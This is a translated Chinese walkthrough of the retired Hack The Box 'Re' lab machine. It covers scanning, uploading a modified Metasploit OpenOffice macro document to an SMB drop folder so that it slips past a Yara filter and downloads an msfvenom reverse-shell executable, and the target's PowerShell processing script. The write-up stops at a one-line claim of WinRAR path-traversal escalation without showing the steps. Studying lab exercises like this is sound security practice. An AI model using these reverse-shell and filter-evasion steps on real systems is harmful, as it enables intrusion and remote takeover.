# HTB-Re 渗透测试全记录

##### 译文声明
本文为翻译文章，具体内容和表达以原文为准。

## 前言
春节期间在家进行渗透测试练习，HTB的Re靶机现已退役。在此分享详细的渗透过程。该靶机涉及了OpenOffice宏后门、Winrar目录穿越以及UsoSvc服务提权等技术点。最终获取system权限并读取flag的过程也颇具挑战性，值得深入学习。

## 端口扫描
```bash
root@kali:~/pentest/re# masscan -e tun0 -p1-65535 10.10.10.144 --rate=1000
Starting masscan 1.0.3 (http://bit.ly/14GZzcT) at 2020-01-26 08:03:07 GMT
-- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Discovered open port 445/tcp on 10.10.10.144
Discovered open port 80/tcp on 10.10.10.144
```
```bash
root@kali:~/pentest/re# nmap -sC -sV -oA Re -p80,445 10.10.10.144
Starting Nmap 7.70 ( https://nmap.org ) at 2020-01-26 08:06 GMT
Nmap scan report for 10.10.10.144
Host is up (0.25s latency).
PORT    STATE SERVICE       VERSION
80/tcp  open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Visit reblog.htb
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: mean: 1h01m10s, deviation: 0s, median: 1h01m10s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-01-13 09:09:21
|_  start_date: N/A
```
扫描结果显示目标主机上开放了HTTP服务（端口80）和SMB共享文件服务（端口445）。

## 博客分析
根据Nmap扫描结果，将域名IP添加到`/etc/hosts`文件中：
```bash
echo "10.10.10.144 treblog.htb" | sudo tee -a /etc/hosts
```
访问web页面，发现是一个博客站点，其中几篇博文值得注意。博主提到提供了一个用于检测ODS文件宏后门的服务，并使用Yara规则进行过滤。

## SMB共享文件夹
尝试匿名访问SMB共享文件夹，发现一个名为`malware_dropbox`的共享目录。
```bash
root@kali:~# smbmap -H 10.10.10.144 -u 'anonymous' -p ''
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.10.10.144...
[+] IP: 10.10.10.144:445        Name: 10.10.10.144
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------            
        IPC$                                                    READ ONLY       Remote IPC
        malware_dropbox                                         READ ONLY
```
尽管显示为只读权限，但实际上可以上传文件。上传任意文件后约一分钟内会被删除，推测这是上述博客中提到的ODS文件检测服务入口。

## ODS文件利用
博文中提及了一篇文章，其中包含生成ODS文件的示例及Yara过滤规则：
```yara
rule metasploit
{
    strings:
        $getos = "select case getGUIType" nocase wide ascii
        $getext = "select case GetOS" nocase wide ascii
        $func1 = "Sub OnLoad" nocase wide ascii
        $func2 = "Sub Exploit" nocase wide ascii
        $func3 = "Function GetOS() as string" nocase wide ascii
        $func4 = "Function GetExtName() as string" nocase wide ascii
    condition:
        (all of ($get*) or 2 of ($func*))
}
```
此规则意味着：若匹配到所有以`$get`开头的字符串或任意两个以`$func`开头的字符串，则文件将被过滤掉。

使用Metasploit生成恶意ODT文件：
```bash
use exploit/multi/misc/openoffice_document_macro
set srvhost 10.10.14.220
set srvport 23333
run
```
解压生成的`msf.odt`文件，修改`/Basic/Standard/Module1.xml`中的宏脚本，移除多余的`Sub Exploit`、`GetOS()` 和 `GetExtName()`函数。由于不确定是否存在其他过滤规则，选择使用`certutil`下载`shell.exe`，避免使用PowerShell反弹脚本。

重新打包并重命名为`msf.ods`。使用`msfvenom`生成后门程序`shell.exe`：
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.220 LPORT=4444 -f exe -i 3 -o shell.exe
```
启动HTTP服务器：
```bash
python3 -m http.server 23333
```
在Metasploit中配置监听器：
```bash
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
```
通过SMB客户端上传生成的`msf.ods`文件：
```bash
root@kali:~/pentest/Re# smbclient \\10.10.10.144\malware_dropbox
Enter WORKGROUProot's password:
Try "help" to get a list of possible commands.
smb: > put msf.ods
```
稍等片刻，HTTP服务器会提示靶机访问`shell.exe`，随后获得Meterpreter Shell并读取用户标志：
```bash
C:UserslukeDesktop>type user.txt
FE4173xxxxxxxxxxxxx0D9F384D3
```

## WinRAR目录穿越
查看当前用户的`Documents`目录，可以看到自动处理ODS文件的脚本和过滤规则：
```bash
Directory of C:UserslukeDocuments
06/18/2019  01:05 PM              .
06/18/2019  01:05 PM              ..
01/13/2020  09:16 PM              malware_dropbox
01/13/2020  09:16 PM              malware_process
01/13/2020  09:16 PM              ods
06/18/2019  09:30 PM             1,096 ods.yara
06/18/2019  09:33 PM             1,783 process_samples.ps1
03/13/2019  05:47 PM         1,485,312 yara64.exe
3 File(s)      1,488,191 bytes
5 Dir(s)  17,590,632,448 bytes free
```
`ods.yara`文件几乎过滤掉了所有常见的PowerShell关键字。`process_samples.ps1`脚本内容如下：
```powershell
$process_dir = "C:UserslukeDocumentsmalware_process"
$files_to_analyze = "C:UserslukeDocumentsods"
$yara = "C:UserslukeDocumentsyara64.exe"
$rule = "C:UserslukeDocumentsods.yara"

while($true) {
    # 获取新样本
    move C:UserslukeDocumentsmalware_dropbox* $process_dir
    # 将每个ODS文件复制为ZIP文件
    Get-ChildItem $process_dir -Filter *.ods | 
    Copy-Item -Destination {$_.fullname -replace ".ods", ".zip"}
    Get-ChildItem $process_dir -Filter *.zip | ForEach-Object {
        # 解压缩存档以访问内容
        $unzipdir = Join-Path $_.directory $_.Basename
        New-Item -Force -ItemType directory -Path $unzipdir | Out-Null
        Expand-Archive $_.fullname -Force -ErrorAction SilentlyContinue -DestinationPath $unzipdir
        # 使用Yara查找已知恶意软件
        $yara_out = & $yara -r $rule $unzipdir
        $ods_name = $_.fullname -replace ".zip", ".ods"
        if ($yara_out.length -gt 0) {
            Remove-Item $ods_name
        }
    }
    # 如果有任何ODS文件剩余，确保它们启动并归档
    $files = ls $process_dir*.ods
    if ( $files.length -gt 0) { 
        # 启动ODS文件
        Invoke-Item "C:UserslukeDocumentsmalware_process*.ods"
        Start-Sleep -s 5
        # 关闭OpenOffice，等待
        Stop-Process -Name soffice*
        Start-Sleep -s 5
        Compress-Archive -Path "$process_dir*.ods" -DestinationPath "$process_dirtemp.zip"
        $hash = (Get-FileHash -Algorithm MD5 $process_dirtemp.zip).hash
        # 上游处理可能期望RAR格式。重命名至.RAR
        Move-Item -Force -Path $process_dirtemp.zip -Destination $files_to_analyze$hash.rar    
    }
    Remove-Item -Recurse -force -Path $process_dir*
    Start-Sleep -s 5
}
```
通过上述步骤，我们成功绕过了Yara过滤规则，利用WinRAR目录穿越技术获得了系统权限。